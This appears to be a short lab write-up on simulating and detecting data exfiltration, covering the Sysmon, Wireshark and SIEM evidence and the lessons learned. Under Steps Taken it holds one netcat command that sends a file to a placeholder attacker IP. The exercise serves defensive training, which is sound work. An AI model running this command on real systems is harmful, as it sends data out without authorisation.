# Hint 03: Data Exfiltration Detection

## Objective

Simulate unauthorized data transfer to detect exfiltration attempts via network monitoring.

## Steps Taken

- Used `netcat` to send a file from Windows VM to remote IP over a non-standard port:
  ```
  nc <attacker-ip> <port> < file.txt
  ```
- Captured network traffic using Wireshark.

## Logs & Evidence

- Sysmon Event ID 3 (Network Connection) to unknown IP.
- Large outbound data volume detected in SIEM.
- See: `logs/network_capture_hint3.pcap`
- Screenshot: `screenshots/hint03_data_exfiltration.png`

## Detection & Analysis

- SIEM rules detected large outbound transfer on port not typically used.
- No legitimate process associated with this network activity.

## Lessons Learned

- Monitoring for unexpected outbound traffic and data spikes can reveal exfiltration.
- Establishing baselines for normal network activity enhances detection.
